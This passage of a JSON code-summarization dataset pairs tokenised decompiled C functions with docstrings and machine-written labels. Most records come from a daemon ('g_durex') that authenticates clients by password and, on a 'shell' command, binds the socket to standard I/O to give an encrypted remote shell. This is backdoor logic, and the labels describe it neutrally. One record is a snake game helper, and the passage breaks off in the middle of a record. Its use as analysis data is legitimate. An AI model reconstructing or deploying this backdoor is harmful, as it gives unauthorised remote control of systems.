            "int",
            "v9",
            ";",
            "unsigned",
            "int",
            "*",
            "i",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "fd_set",
            "readfds",
            ";",
            "char",
            "v13",
            "[",
            "16",
            "]",
            ";",
            "int",
            "v14",
            ";",
            "__int64",
            "buf",
            "[",
            "2",
            "]",
            ";",
            "int",
            "v16",
            ";",
            "unsigned",
            "__int64",
            "v17",
            ";",
            "v17",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v4",
            "=",
            "0",
            ";",
            "v5",
            "=",
            "g_durex",
            "[",
            "2",
            "]",
            ";",
            "fd",
            "=",
            "-",
            "1",
            ";",
            "addr_len",
            "=",
            "16",
            ";",
            "v7",
            "=",
            "-",
            "1",
            ";",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "v14",
            "=",
            "0",
            ";",
            "buf",
            "[",
            "1",
            "]",
            "=",
            "32L",
            "L",
            ";",
            "v16",
            "=",
            "0",
            ";",
            "strcpy",
            "(",
            "v13",
            ",",
            "\"Access granted\\n\"",
            ")",
            ";",
            "buf",
            "[",
            "0",
            "]",
            "=",
            "0x2465646F6379654BL",
            "L",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "do",
            "{",
            "LABEL_2",
            ":",
            "memset",
            "(",
            "&",
            "readfds",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "readfds",
            ")",
            ")",
            ";",
            "v8",
            "=",
            "0",
            ";",
            "v9",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "v13",
            ";",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "g_durex",
            "[",
            "2",
            "]",
            "/",
            "64",
            "]",
            "|",
            "=",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            "%",
            "64",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            "*",
            ")",
            "&",
            "g_durex",
            "[",
            "4",
            "]",
            ";",
            "i",
            ";",
            "i",
            "=",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "i",
            "+",
            "11",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "i",
            "[",
            "2",
            "]",
            ")",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "(",
            "int",
            ")",
            "*",
            "i",
            "/",
            "64",
            "]",
            "|",
            "=",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "(",
            "int",
            ")",
            "*",
            "i",
            "%",
            "64",
            ")",
            ";",
            "}",
            "}",
            "while",
            "(",
            "select",
            "(",
            "v5",
            "+",
            "1",
            ",",
            "&",
            "readfds",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            "<",
            "0",
            ")",
            ";",
            "if",
            "(",
            "(",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "g_durex",
            "[",
            "2",
            "]",
            "/",
            "64",
            "]",
            "&",
            "(",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            "%",
            "64",
            ")",
            ")",
            ")",
            "=",
            "=",
            "0",
            ")",
            "break",
            ";",
            "fd",
            "=",
            "accept",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            ",",
            "&",
            "addr",
            ",",
            "&",
            "addr_len",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to accept connection\"",
            ")",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"New connection accepted.\"",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "3",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Maximum number of simultaneous connections reached. Closing connection.\"",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "}",
            "else",
            "{",
            "v0",
            "=",
            "client_new",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "client_add",
            "(",
            "&",
            "g_durex",
            "[",
            "4",
            "]",
            ",",
            "v0",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Unable to store client socket. Closing connection.\"",
            ")",
            ";",
            "}",
            "else",
            "{",
            "+",
            "+",
            "v4",
            ";",
            "v1",
            "=",
            "fd",
            ";",
            "if",
            "(",
            "v5",
            ">",
            "=",
            "fd",
            ")",
            "v1",
            "=",
            "v5",
            ";",
            "v5",
            "=",
            "v1",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "buf",
            ",",
            "0xAuL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "}",
            "}",
            "}",
            "}",
            "for",
            "(",
            "i",
            "=",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            "*",
            ")",
            "&",
            "g_durex",
            "[",
            "4",
            "]",
            ";",
            ";",
            "i",
            "=",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "i",
            "+",
            "11",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "i",
            ")",
            "goto",
            "LABEL_2",
            ";",
            "if",
            "(",
            "!",
            "i",
            "[",
            "2",
            "]",
            "&",
            "&",
            "(",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "(",
            "int",
            ")",
            "*",
            "i",
            "/",
            "64",
            "]",
            "&",
            "(",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "(",
            "int",
            ")",
            "*",
            "i",
            "%",
            "64",
            ")",
            ")",
            ")",
            "!",
            "=",
            "0",
            ")",
            "break",
            ";",
            "LABEL_29",
            ":",
            ";",
            "}",
            "v7",
            "=",
            "server_handle_message",
            "(",
            "(",
            "__int64",
            ")",
            "i",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "=",
            "=",
            "2",
            ")",
            "{",
            "-",
            "-",
            "v4",
            ";",
            "client_ofree",
            "(",
            "&",
            "g_durex",
            "[",
            "4",
            "]",
            ",",
            "*",
            "i",
            ")",
            ";",
            "goto",
            "LABEL_29",
            ";",
            "}",
            "if",
            "(",
            "v7",
            "!",
            "=",
            "6",
            ")",
            "{",
            "if",
            "(",
            "v7",
            "=",
            "=",
            "3",
            ")",
            "{",
            "send",
            "(",
            "*",
            "i",
            ",",
            "v13",
            ",",
            "0x10uL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "v7",
            "=",
            "=",
            "4",
            ")",
            "{",
            "send",
            "(",
            "*",
            "i",
            ",",
            "buf",
            ",",
            "0xAuL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "}",
            "goto",
            "LABEL_29",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"__read\" function appears to be a custom function used for reading data from various sources such as devices, file systems, or shared libraries, possibly within an operating system or middleware framework."
        ],
        "longer_label": "The provided code defines a function `server_handle_connections` responsible for managing incoming connections, accepting new connections, handling client messages, and sending responses, while utilizing a custom read function and maintaining a maximum limit on simultaneous connections."
    },
    {
        "id": 154,
        "docstring_tokens": [
            "The",
            "code",
            "handles",
            "incoming",
            "messages",
            "from",
            "a",
            "client",
            ",",
            "checking",
            "for",
            "login",
            "status",
            "and",
            "processing",
            "commands",
            "based",
            "on",
            "the",
            "client",
            "'s",
            "status",
            "and",
            "input",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "__int64",
            "v2",
            ";",
            "char",
            "*",
            "s2",
            ";",
            "__int64",
            "buf",
            "[",
            "514",
            "]",
            ";",
            "buf",
            "[",
            "513",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "4096",
            ")",
            ";",
            "v2",
            "=",
            "read",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ",",
            "buf",
            ",",
            "0xFFFuL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v2",
            "<",
            "0",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to read on client socket.\"",
            ")",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "if",
            "(",
            "!",
            "v2",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Client disconnected.\"",
            ")",
            ";",
            "return",
            "2L",
            "L",
            ";",
            "}",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "buf",
            "+",
            "v2",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "4",
            ")",
            "=",
            "=",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Unknown user. Checking password validity...\"",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "server_login",
            "(",
            "(",
            "__int64",
            ")",
            "buf",
            ",",
            "v2",
            ")",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Invalid password. User access denied.\"",
            ")",
            ";",
            "return",
            "4L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "4",
            ")",
            "=",
            "2",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Valid password. User access granted.\"",
            ")",
            ";",
            "init_key",
            "(",
            "a1",
            ")",
            ";",
            "return",
            "3L",
            "L",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "4",
            ")",
            "!",
            "=",
            "2",
            "|",
            "|",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "64",
            ")",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "4",
            ")",
            "=",
            "=",
            "2",
            "&",
            "&",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "64",
            ")",
            "=",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "72",
            ")",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "72",
            ")",
            "=",
            "malloc",
            "(",
            "0xB3B0uL",
            "L",
            ")",
            ";",
            "rijn_init",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "72",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            ")",
            ";",
            "}",
            "s2",
            "=",
            "(",
            "char",
            "*",
            ")",
            "rijn_build_decrypt",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "72",
            ")",
            ",",
            "buf",
            ")",
            ";",
            "if",
            "(",
            "!",
            "s2",
            ")",
            "return",
            "5L",
            "L",
            ";",
            "daemon_report",
            "(",
            "\"[ USER ]\"",
            ",",
            "s2",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Known user. Evaluating command...\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "\"quit\"",
            ",",
            "s2",
            ")",
            ")",
            "return",
            "6L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "\"shell\"",
            ",",
            "s2",
            ")",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Spawning a remote shell...\"",
            ")",
            ";",
            "shell_master",
            "(",
            "a1",
            ")",
            ";",
            "}",
            "free",
            "(",
            "s2",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Known user. Encryption key not set, checking...\"",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "handle_keys",
            "(",
            "buf",
            ",",
            "a1",
            ")",
            "=",
            "=",
            "-",
            "2",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "return",
            "5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"__read\" function appears to be used for reading data from a device or file, as it involves allocating memory for a buffer, calling the read function of a device or file, and then printing the buffer contents.",
            "The function \"qword\" likely deals with handling or manipulating quad-word (64-bit) data types, but without any code snippets provided, it's impossible to ascertain its specific functionality."
        ],
        "longer_label": "The provided code is a server message handler function written in C, which reads data from a client socket, performs authentication and command evaluation for known users, handles encryption key initialization, and interacts with a remote shell if requested, utilizing various functions and memory management techniques."
    },
    {
        "id": 155,
        "docstring_tokens": [
            "The",
            "function",
            "shell_sigchld_handler",
            "handles",
            "the",
            "SIGCHLD",
            "signal",
            ",",
            "which",
            "is",
            "triggered",
            "when",
            "a",
            "child",
            "process",
            "terminates",
            ",",
            "by",
            "checking",
            "if",
            "the",
            "process",
            "ID",
            "matches",
            "any",
            "active",
            "client",
            "'s",
            "process",
            "ID",
            "and",
            "setting",
            "the",
            "client",
            "'s",
            "shell",
            "flag",
            "to",
            "FALSE",
            "and",
            "PID",
            "to",
            "-1",
            "if",
            "a",
            "match",
            "is",
            "found",
            "."
        ],
        "code_tokens": [
            "void",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "stat_loc",
            ";",
            "__pid_t",
            "v1",
            ";",
            "__int64",
            "i",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"Sigchld handler triggered\"",
            ")",
            ";",
            "v1",
            "=",
            "waitpid",
            "(",
            "-",
            "1",
            ",",
            "&",
            "stat_loc",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "g_durex",
            "[",
            "2",
            "]",
            ";",
            "i",
            ";",
            "i",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "88",
            ")",
            ")",
            "{",
            "if",
            "(",
            "v1",
            "=",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "80",
            ")",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ SIGNAL ]\"",
            ",",
            "\"SIGCHLD signal caught. Killing remote shell.\"",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "8",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "80",
            ")",
            "=",
            "-",
            "1",
            ";",
            "return",
            ";",
            "}",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit integer value from the FS segment register at the specified offset, primarily for low-level system programming tasks on x86 architectures, particularly in Windows environments."
        ],
        "longer_label": "The provided code defines a signal handler function in C that responds to the SIGCHLD signal, likely used in a Unix-like environment, utilizing low-level system functions like `waitpid` and `__readfsqword` to manage child processes, and it includes annotations explaining the purpose of the `__readfsqword` function."
    },
    {
        "id": 156,
        "docstring_tokens": [
            "The",
            "function",
            "shell_master",
            "creates",
            "a",
            "new",
            "process",
            "and",
            "sets",
            "up",
            "socket",
            "duplication",
            ",",
            "standard",
            "I/O",
            "redirection",
            ",",
            "and",
            "two-way",
            "pipe",
            "communication",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "shell_master",
            "(",
            "int",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "stat_loc",
            ";",
            "__pid_t",
            "pid",
            ";",
            "__pid_t",
            "v4",
            ";",
            "int",
            "pipedes",
            "[",
            "2",
            "]",
            ";",
            "int",
            "v6",
            "[",
            "2",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "v7",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "signal",
            "(",
            "17",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "shell_sigchld_handler",
            ")",
            "=",
            "=",
            "(",
            "__sighandler_t",
            ")",
            "-",
            "1L",
            "L",
            ")",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to set SIGCHLD signal handler.\"",
            ")",
            ";",
            "else",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"SIGCHLD signal handler set.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"Forking main process for socket duplication...\"",
            ")",
            ";",
            "pid",
            "=",
            "fork",
            "(",
            ")",
            ";",
            "a1",
            "[",
            "2",
            "]",
            "=",
            "1",
            ";",
            "a1",
            "[",
            "20",
            "]",
            "=",
            "pid",
            ";",
            "if",
            "(",
            "pid",
            ">",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "pid",
            "<",
            "=",
            "0",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"Replacing standard I/O by socket fd...\"",
            ")",
            ";",
            "dup2",
            "(",
            "*",
            "a1",
            ",",
            "0",
            ")",
            ";",
            "dup2",
            "(",
            "*",
            "a1",
            ",",
            "1",
            ")",
            ";",
            "dup2",
            "(",
            "*",
            "a1",
            ",",
            "2",
            ")",
            ";",
            "close",
            "(",
            "*",
            "a1",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"Creating 1/2 of the two-way pipes...\"",
            ")",
            ";",
            "if",
            "(",
            "pipe",
            "(",
            "pipedes",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to create pipe.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"Pipe created.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"Creating 2/2 of the two-way pipes...\"",
            ")",
            ";",
            "if",
            "(",
            "pipe",
            "(",
            "v6",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to create pipe.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"Pipe created.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ DEBUG ]\"",
            ",",
            "\"Re-forking main process for pipe communication...\"",
            ")",
            ";",
            "v4",
            "=",
            "fork",
            "(",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "<",
            "0",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to fork.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v4",
            ">",
            "0",
            ")",
            "shell_parent",
            "(",
            "v6",
            ",",
            "pipedes",
            ",",
            "(",
            "__int64",
            ")",
            "a1",
            ")",
            ";",
            "shell_child",
            "(",
            "pipedes",
            ",",
            "v6",
            ")",
            ";",
            "}",
            "waitpid",
            "(",
            "pid",
            ",",
            "&",
            "stat_loc",
            ",",
            "1",
            ")",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to fork.\"",
            ")",
            ";",
            "a1",
            "[",
            "2",
            "]",
            "=",
            "0",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v7",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is likely used to read a quadword (64 bits) from a specific offset within the FS segment, primarily intended for low-level system programming, such as accessing thread information block (TIB) on Windows."
        ],
        "longer_label": "The provided code is a function likely intended for low-level system programming, involving forking processes, setting signal handlers, duplicating sockets, creating two-way pipes, and utilizing the `__readfsqword` function to read from a specific offset within the FS segment, potentially for accessing thread information block (TIB) on Windows."
    },
    {
        "id": 157,
        "docstring_tokens": [
            "This",
            "code",
            "generates",
            "a",
            "random",
            "location",
            "for",
            "an",
            "apple",
            "on",
            "a",
            "game",
            "board",
            "while",
            "ensuring",
            "the",
            "location",
            "is",
            "empty",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "v0",
            ";",
            "__int64",
            "v1",
            ";",
            "int",
            "v2",
            ";",
            "do",
            "{",
            "v0",
            "=",
            "rand",
            "(",
            ")",
            "%",
            "25",
            ";",
            "v1",
            "=",
            "rand",
            "(",
            ")",
            "%",
            "50",
            "+",
            "50",
            "*",
            "v0",
            ";",
            "}",
            "while",
            "(",
            "board",
            "[",
            "v1",
            "]",
            ")",
            ";",
            "v2",
            "=",
            "apple_age",
            ";",
            "board",
            "[",
            "v1",
            "]",
            "=",
            "v2",
            "/",
            "-",
            "2",
            "-",
            "rand",
            "(",
            ")",
            "%",
            "apple_age",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function to generate an \"apple\" on a game board, ensuring it does not overlap with existing elements, and assigns an age to the apple on the board based on the current age and a random factor."
    },
    {
        "id": 158,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "shell_parent",
            "`",
            "reads",
            "input",
            "from",
            "a",
            "pipe",
            ",",
            "decrypts",
            "it",
            "using",
            "a",
            "specific",
            "algorithm",
            ",",
            "and",
            "then",
            "writes",
            "the",
            "decrypted",
            "data",
            "to",
            "another",
            "pipe",
            "while",
            "also",
            "encrypting",
            "and",
            "writing",
            "input",
            "from",
            "the",
            "user",
            "to",
            "the",
            "standard",
            "output",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "shell_parent",
            "(",
            "int",
            "*",
            "a1",
            ",",
            "int",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "int",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "void",
            "*",
            "ptr",
            ";",
            "void",
            "*",
            "v9",
            ";",
            "fd_set",
            "readfds",
            ";",
            "__int64",
            "buf",
            "[",
            "514",
            "]",
            ";",
            "buf",
            "[",
            "513",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "4096",
            ")",
            ";",
            "close",
            "(",
            "a1",
            "[",
            "1",
            "]",
            ")",
            ";",
            "close",
            "(",
            "*",
            "a2",
            ")",
            ";",
            "v3",
            "=",
            "*",
            "a1",
            ";",
            "if",
            "(",
            "*",
            "a1",
            "<",
            "0",
            ")",
            "v3",
            "=",
            "0",
            ";",
            "v5",
            "=",
            "v3",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "do",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "do",
            "{",
            "memset",
            "(",
            "&",
            "readfds",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "readfds",
            ")",
            ")",
            ";",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "0",
            "]",
            "|",
            "=",
            "1uL",
            "L",
            ";",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "*",
            "a1",
            "/",
            "64",
            "]",
            "|",
            "=",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "*",
            "a1",
            "%",
            "64",
            ")",
            ";",
            "}",
            "while",
            "(",
            "select",
            "(",
            "v5",
            "+",
            "1",
            ",",
            "&",
            "readfds",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            "<",
            "0",
            ")",
            ";",
            "if",
            "(",
            "(",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "0",
            "]",
            "&",
            "1",
            ")",
            "=",
            "=",
            "0",
            ")",
            "break",
            ";",
            "v6",
            "=",
            "read",
            "(",
            "0",
            ",",
            "buf",
            ",",
            "0x401uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v6",
            ")",
            "goto",
            "LABEL_18",
            ";",
            "if",
            "(",
            "v6",
            ">",
            "0",
            ")",
            "{",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "buf",
            "+",
            "v6",
            ")",
            "=",
            "0",
            ";",
            "ptr",
            "=",
            "(",
            "void",
            "*",
            ")",
            "rijn_build_decrypt",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a3",
            "+",
            "72",
            ")",
            ",",
            "buf",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ SHELL ]\"",
            ",",
            "ptr",
            ")",
            ";",
            "write",
            "(",
            "a2",
            "[",
            "1",
            "]",
            ",",
            "ptr",
            ",",
            "v6",
            ")",
            ";",
            "write",
            "(",
            "a2",
            "[",
            "1",
            "]",
            ",",
            "\"\\n\"",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "ptr",
            ")",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "}",
            "}",
            "}",
            "while",
            "(",
            "(",
            "readfds",
            ".",
            "fds_bits",
            "[",
            "*",
            "a1",
            "/",
            "64",
            "]",
            "&",
            "(",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "*",
            "a1",
            "%",
            "64",
            ")",
            ")",
            ")",
            "=",
            "=",
            "0",
            ")",
            ";",
            "v7",
            "=",
            "read",
            "(",
            "*",
            "a1",
            ",",
            "buf",
            ",",
            "0x3FFuL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v7",
            ")",
            "{",
            "LABEL_18",
            ":",
            "close",
            "(",
            "*",
            "a1",
            ")",
            ";",
            "close",
            "(",
            "a2",
            "[",
            "1",
            "]",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v7",
            ">",
            "0",
            ")",
            "{",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "buf",
            "+",
            "v7",
            ")",
            "=",
            "0",
            ";",
            "v9",
            "=",
            "(",
            "void",
            "*",
            ")",
            "rijn_build_encrypt",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a3",
            "+",
            "72",
            ")",
            ",",
            "buf",
            ")",
            ";",
            "write",
            "(",
            "1",
            ",",
            "v9",
            ",",
            "v7",
            "+",
            "16",
            "-",
            "v7",
            "%",
            "16",
            "+",
            "1",
            ")",
            ";",
            "usleep",
            "(",
            "0xC350u",
            ")",
            ";",
            "if",
            "(",
            "v9",
            ")",
            "free",
            "(",
            "v9",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "Based on the provided information, the function named \"qword\" likely deals with processing or manipulating 64-bit integers in a programming language such as assembly or C/C++.",
            "The function `memset` is being implemented using various methods and optimizations to initialize blocks of memory with a specific value, likely for memory allocation or manipulation purposes, including zeroing out memory blocks and ensuring alignment, with some snippets utilizing compiler built-in functions for efficiency.",
            "The function `build_` appears to be involved in various tasks across different code snippets, such as initializing and populating data structures, processing input paths, defining packed structures for data transmission, and allocating memory for tree structures, likely serving as a foundational function for setting up and managing resources in a larger software project."
        ],
        "longer_label": "The provided code is a function named \"shell_parent\" designed to create a parent shell process that communicates with a child process through pipes, decrypting and encrypting incoming and outgoing data using a cryptographic algorithm, while handling I/O operations and managing memory, likely forming part of a larger software system."
    },
    {
        "id": 159,
        "docstring_tokens": [
            "The",
            "shell_child",
            "function",
            "sets",
            "up",
            "a",
            "pipeline",
            "between",
            "two",
            "commands",
            "using",
            "input",
            "and",
            "output",
            "pipes",
            ",",
            "then",
            "executes",
            "a",
            "new",
            "shell",
            "process",
            "and",
            "connects",
            "it",
            "to",
            "the",
            "pipeline",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "shell_child",
            "(",
            "int",
            "*",
            "a1",
            ",",
            "int",
            "*",
            "a2",
            ")",
            "{",
            "char",
            "*",
            "argv",
            "[",
            "4",
            "]",
            ";",
            "argv",
            "[",
            "3",
            "]",
            "=",
            "(",
            "char",
            "*",
            ")",
